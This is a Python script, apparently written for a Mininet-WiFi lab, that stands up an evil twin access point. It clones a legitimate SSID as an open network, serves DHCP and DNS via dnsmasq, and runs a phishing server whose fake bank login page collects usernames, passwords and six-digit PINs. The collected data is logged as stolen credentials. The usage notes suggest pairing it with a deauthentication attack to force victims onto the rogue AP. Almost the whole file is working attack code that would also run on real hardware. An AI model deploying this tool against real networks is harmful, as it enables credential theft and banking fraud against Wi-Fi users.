#!/usr/bin/env python3
"""
Evil Twin / Rogue AP — AP falso con el mismo SSID que el AP legítimo
Levanta un Access Point usando hostapd + DHCP (dnsmasq) + servidor HTTP de phishing.
Compatible con el escenario wifi-attacks de Mininet-WiFi.

Uso desde la CLI de Mininet:
  mininet> attacker python3 /tmp/evil_twin.py --ssid RedInsegura --iface attacker-wlan1 --phishing
"""

import os
import sys
import time
import signal
import argparse
import subprocess
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

PHISHING_HTML = """\
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>BancoSeguro - Acceso a Banca Online</title>
  <style>
    body {{ background:#c00; font-family:Arial,sans-serif; display:flex;
            justify-content:center; align-items:center; height:100vh; margin:0; }}
    .box {{ background:#fff; padding:40px; border-radius:8px; width:350px; text-align:center; }}
    h1 {{ color:#c00; }}
    .warning {{ background:#ffeeee; border:1px solid #c00; padding:10px;
                margin-bottom:20px; font-size:12px; color:#555; }}
    input {{ width:100%; padding:10px; margin:8px 0; box-sizing:border-box; font-size:14px; }}
    button {{ background:#c00; color:#fff; border:none; padding:12px;
              width:100%; font-size:16px; cursor:pointer; border-radius:4px; }}
    .fake-cert {{ font-size:11px; color:#888; margin-top:10px; }}
  </style>
</head>
<body>
  <div class="box">
    <h1>&#127968; BancoSeguro</h1>
    <div class="warning">&#9888; Sesión expirada. Introduce tus credenciales para continuar.</div>
    <form method="POST" action="/login">
      <input type="text"     name="usuario"    placeholder="Usuario o NIF"  required>
      <input type="password" name="contrasena" placeholder="Contraseña"     required>
      <input type="text"     name="pin"        placeholder="PIN de 6 dígitos" required>
      <button type="submit">Acceder</button>
    </form>
    <p class="fake-cert">&#128274; Conexión segura | BancoSeguro S.A. © 2026</p>
  </div>
</body>
</html>
"""

captured_creds = []
procs = []
stats = {
    'clients_connected': 0,
    'http_requests':     0,
    'credentials_captured': 0,
    'start_time':        None,
}


def get_timestamp():
    return datetime.now().strftime("%H:%M:%S")


def print_header(args):
    print('\n' + '='*65)
    print('  EVIL TWIN / ROGUE AP - AP FALSO PHISHING')
    print('='*65)
    print('SSID:       %s  (identico al AP legitimo)' % args.ssid)
    print('Interfaz:   %s' % args.iface)
    print('Canal:      %s' % args.channel)
    print('IP AP:      %s/24' % args.ip)
    print('DHCP:       %s - %s' % (args.dhcp_start, args.dhcp_end))
    print('Phishing:   %s' % ('SI - HTTP :80 (pagina de login falsa)' if args.phishing else 'NO'))
    print('Timestamp:  %s' % get_timestamp())
    print('='*65)
    print('[*] Configurando Evil Twin...')
    print('[*] Combinar con deauth_attack.py para forzar reconexion de victimas')
    print('-'*65)


def write_hostapd_conf(iface, ssid, channel):
    """Genera la configuración de hostapd para el AP falso (red abierta, sin cifrado)."""
    conf_path = '/tmp/evil_twin_hostapd.conf'
    config = (
        'interface=%s\n'
        'driver=nl80211\n'
        'ssid=%s\n'
        'hw_mode=g\n'
        'channel=%s\n'
        'macaddr_acl=0\n'
        'auth_algs=1\n'
        'ignore_broadcast_ssid=0\n'
        # Sin cifrado (open) — el cliente legítimo puede conectar sin conocer la clave
        # y el atacante ve todo su tráfico en claro
    ) % (iface, ssid, channel)
    with open(conf_path, 'w') as f:
        f.write(config)
    return conf_path


def write_dnsmasq_conf(iface, gw_ip, dhcp_start, dhcp_end):
    """Genera la configuración de dnsmasq para DHCP en el AP falso."""
    conf_path = '/tmp/evil_twin_dnsmasq.conf'
    config = (
        'interface=%s\n'
        'bind-interfaces\n'
        'dhcp-range=%s,%s,12h\n'
        'dhcp-option=option:router,%s\n'
        'dhcp-option=option:dns-server,%s\n'
        'log-queries\n'
        'log-dhcp\n'
        'log-facility=/tmp/evil_twin_dnsmasq.log\n'
    ) % (iface, dhcp_start, dhcp_end, gw_ip, gw_ip)
    with open(conf_path, 'w') as f:
        f.write(config)
    return conf_path


class PhishingHandler(BaseHTTPRequestHandler):
    """Servidor HTTP que sirve la página de phishing y captura credenciales."""

    def log_message(self, fmt, *args):
        stats['http_requests'] += 1
        client_ip = self.client_address[0]
        print('[%s] [HTTP] %s - %s' % (get_timestamp(), client_ip,
                                        fmt % args))

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(PHISHING_HTML.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')

        # Parsear credenciales del form POST
        creds = {}
        for pair in body.split('&'):
            if '=' in pair:
                k, _, v = pair.partition('=')
                creds[k] = v.replace('+', ' ')

        client_ip = self.client_address[0]
        stats['credentials_captured'] += 1

        print('\n[%s] [!!] CREDENCIALES CAPTURADAS desde %s:' % (get_timestamp(), client_ip))
        for k, v in creds.items():
            print('         %-12s = %s' % (k, v))
        print()

        captured_creds.append({'ip': client_ip, 'data': creds, 'time': get_timestamp()})

        # Redirigir a página de error (simula fallo de autenticación)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(
            b'<html><body style="text-align:center;font-family:Arial;">'
            b'<h2>Error de autenticaci\xc3\xb3n</h2>'
            b'<p>Sus credenciales son incorrectas. Int\xc3\xa9ntelo de nuevo.</p>'
            b'<a href="/">Volver</a></body></html>'
        )


def start_phishing_server(port=80):
    """Lanza el servidor HTTP de phishing en un hilo separado."""
    try:
        server = HTTPServer(('0.0.0.0', port), PhishingHandler)
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        print('[%s] [OK] Servidor phishing HTTP:%d activo' % (get_timestamp(), port))
        return server
    except Exception as e:
        print('[%s] [WARN] No se pudo iniciar servidor phishing: %s' % (get_timestamp(), e))
        return None


def monitor_hostapd_log(log_path):
    """Monitoriza el log de hostapd para mostrar conexiones de clientes."""
    def _tail():
        try:
            with open(log_path, 'r') as f:
                f.seek(0, 2)  # ir al final
                while True:
                    line = f.readline()
                    if not line:
                        time.sleep(0.2)
                        continue
                    line = line.strip()
                    if 'AP-STA-CONNECTED' in line:
                        mac = line.split()[-1] if line.split() else '?'
                        stats['clients_connected'] += 1
                        print('\n[%s] [>>] CLIENTE CONECTADO AL AP FALSO: %s' % (get_timestamp(), mac))
                        print('         Total clientes: %d' % stats['clients_connected'])
                    elif 'AP-STA-DISCONNECTED' in line:
                        mac = line.split()[-1] if line.split() else '?'
                        print('[%s] [--] Cliente desconectado: %s' % (get_timestamp(), mac))
        except Exception:
            pass

    t = threading.Thread(target=_tail, daemon=True)
    t.start()


def print_summary():
    elapsed = time.time() - stats['start_time'] if stats['start_time'] else 0
    print('\n\n' + '='*65)
    print('  RESUMEN EVIL TWIN')
    print('='*65)
    print('Duracion:              %.0f segundos' % elapsed)
    print('Clientes conectados:   %d' % stats['clients_connected'])
    print('Peticiones HTTP:       %d' % stats['http_requests'])
    print('Credenciales robadas:  %d' % stats['credentials_captured'])
    if captured_creds:
        print('\nCredenciales capturadas:')
        for c in captured_creds:
            print('  [%s] %s - %s' % (c['time'], c['ip'], c['data']))
    print('='*65)


def cleanup():
    for p in procs:
        try:
            p.terminate()
        except Exception:
            pass
    os.system('sudo pkill -f evil_twin_hostapd 2>/dev/null; true')
    os.system('sudo pkill -f evil_twin_dnsmasq 2>/dev/null; true')


def run_evil_twin(args):
    if os.geteuid() != 0:
        print('[ERROR] Se requieren privilegios root.')
        sys.exit(1)

    print_header(args)
    stats['start_time'] = time.time()

    def _sigint(s, f):
        print_summary()
        os.system('ip rule del from %s/32 lookup 200 2>/dev/null; true' % args.ip)
        os.system('ip route flush table 200 2>/dev/null; true')
        cleanup()
        sys.exit(0)
    signal.signal(signal.SIGINT, _sigint)

    # Configurar IP en la interfaz del AP falso
    print('[%s] [*] Configurando interfaz %s con IP %s...' % (get_timestamp(), args.iface, args.ip))
    os.system('ip addr flush dev %s 2>/dev/null; true' % args.iface)
    os.system('ip addr add %s/24 dev %s 2>/dev/null; true' % (args.ip, args.iface))
    os.system('ip link set %s up 2>/dev/null; true' % args.iface)

    # rp_filter (strict mode) drops packets arriving on this interface when the
    # reverse route to the source goes via a different interface (wlan0 on same /24).
    # Disable it so the kernel accepts and processes the incoming frames.
    os.system('echo 0 > /proc/sys/net/ipv4/conf/%s/rp_filter 2>/dev/null; true' % args.iface)
    os.system('echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null; true')
    # Policy routing table 200: traffic sourced from the Evil Twin IP always
    # exits via the Evil Twin interface, not via the attacker's primary wlan.
    _net_pfx = '.'.join(args.ip.split('.')[:3]) + '.0'
    os.system('ip rule add from %s/32 lookup 200 priority 100 2>/dev/null; true' % args.ip)
    os.system('ip route replace %s/24 dev %s table 200 2>/dev/null; true' % (_net_pfx, args.iface))

    # Escribir y lanzar hostapd
    conf_path = write_hostapd_conf(args.iface, args.ssid, args.channel)
    print('[%s] [*] Lanzando hostapd (AP falso SSID: %s)...' % (get_timestamp(), args.ssid))
    hostapd_log = '/tmp/evil_twin_hostapd.log'
    with open(hostapd_log, 'w') as log_f:
        p_hostapd = subprocess.Popen(
            ['hostapd', conf_path],
            stdout=log_f, stderr=log_f
        )
    procs.append(p_hostapd)
    time.sleep(2)

    if p_hostapd.poll() is not None:
        print('[%s] [ERROR] hostapd termino prematuramente. Ver log: %s' % (get_timestamp(), hostapd_log))
        os.system('tail -20 %s' % hostapd_log)
        sys.exit(1)
    print('[%s] [OK]  hostapd en ejecucion (PID: %d)' % (get_timestamp(), p_hostapd.pid))

    # Lanzar dnsmasq para DHCP
    dnsmasq_conf = write_dnsmasq_conf(args.iface, args.ip, args.dhcp_start, args.dhcp_end)
    print('[%s] [*] Lanzando dnsmasq (DHCP %s - %s)...' % (get_timestamp(), args.dhcp_start, args.dhcp_end))
    p_dnsmasq = subprocess.Popen(
        ['dnsmasq', '--no-daemon', '-C', dnsmasq_conf],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    procs.append(p_dnsmasq)
    time.sleep(1)
    print('[%s] [OK]  dnsmasq en ejecucion (PID: %d)' % (get_timestamp(), p_dnsmasq.pid))

    # Servidor de phishing
    phishing_srv = None
    if args.phishing:
        print('[%s] [*] Iniciando servidor phishing HTTP:80...' % get_timestamp())
        phishing_srv = start_phishing_server(port=80)

    # Habilitar IP forwarding para redirigir tráfico del cliente
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # Monitorizar log de hostapd para conexiones
    monitor_hostapd_log(hostapd_log)

    print('\n' + '='*65)
    print('[%s] [OK] Evil Twin ACTIVO - esperando victimas...' % get_timestamp())
    print('         Combinar con deauth_attack.py para forzar reconexion.')
    print('         Log hostapd: %s' % hostapd_log)
    print('         Presiona Ctrl+C para detener.')
    print('='*65 + '\n')

    # Bucle principal: mostrar estadísticas periódicamente
    try:
        while True:
            time.sleep(10)
            elapsed = time.time() - stats['start_time']
            print('[%s] [=] Clientes: %d | Peticiones HTTP: %d | Credenciales: %d | %.0fs'
                  % (get_timestamp(), stats['clients_connected'],
                     stats['http_requests'], stats['credentials_captured'], elapsed))
    except KeyboardInterrupt:
        pass

    os.system('ip rule del from %s/32 lookup 200 2>/dev/null; true' % args.ip)
    os.system('ip route flush table 200 2>/dev/null; true')
    print_summary()
    cleanup()


def parse_args():
    parser = argparse.ArgumentParser(
        description='Evil Twin / Rogue AP - AP falso con phishing para capturar credenciales',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # AP falso con phishing (desde la CLI de Mininet)
  mininet> attacker python3 /tmp/evil_twin.py --ssid RedInsegura --iface attacker-wlan1 --phishing

  # Sin phishing (solo como punto de acceso falso para MITM)
  mininet> attacker python3 /tmp/evil_twin.py --ssid RedInsegura --iface attacker-wlan1

  # Combinado con deauth para forzar reconexión al AP falso:
  mininet> attacker python3 /tmp/deauth_attack.py --bssid <MAC_AP_REAL> --client <MAC_STA1> &
  mininet> attacker python3 /tmp/evil_twin.py --ssid RedInsegura --iface attacker-wlan1 --phishing
        """
    )
    parser.add_argument('--ssid',       default='RedInsegura',
                        help='SSID del AP falso (debe ser igual al AP legitimo, default: RedInsegura)')
    parser.add_argument('--iface',      default='attacker-wlan1',
                        help='Interfaz WiFi para el AP falso (default: attacker-wlan1)')
    parser.add_argument('--channel',    default='6',
                        help='Canal WiFi (default: 6)')
    parser.add_argument('--ip',         default='10.0.4.200',
                        help='IP del gateway del AP falso (default: 10.0.4.200)')
    parser.add_argument('--dhcp-start', default='10.0.4.210',
                        help='Inicio del rango DHCP (default: 10.0.4.210)')
    parser.add_argument('--dhcp-end',   default='10.0.4.220',
                        help='Fin del rango DHCP (default: 10.0.4.220)')
    parser.add_argument('--phishing',   action='store_true',
                        help='Levantar servidor HTTP con pagina de login falsa (phishing)')
    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()
    try:
        run_evil_twin(args)
    except Exception as e:
        print('\n[ERROR] %s' % e)
        import traceback
        traceback.print_exc()
        os.system('ip rule del from %s/32 lookup 200 2>/dev/null; true' % args.ip)
        os.system('ip route flush table 200 2>/dev/null; true')
        cleanup()
        sys.exit(1)
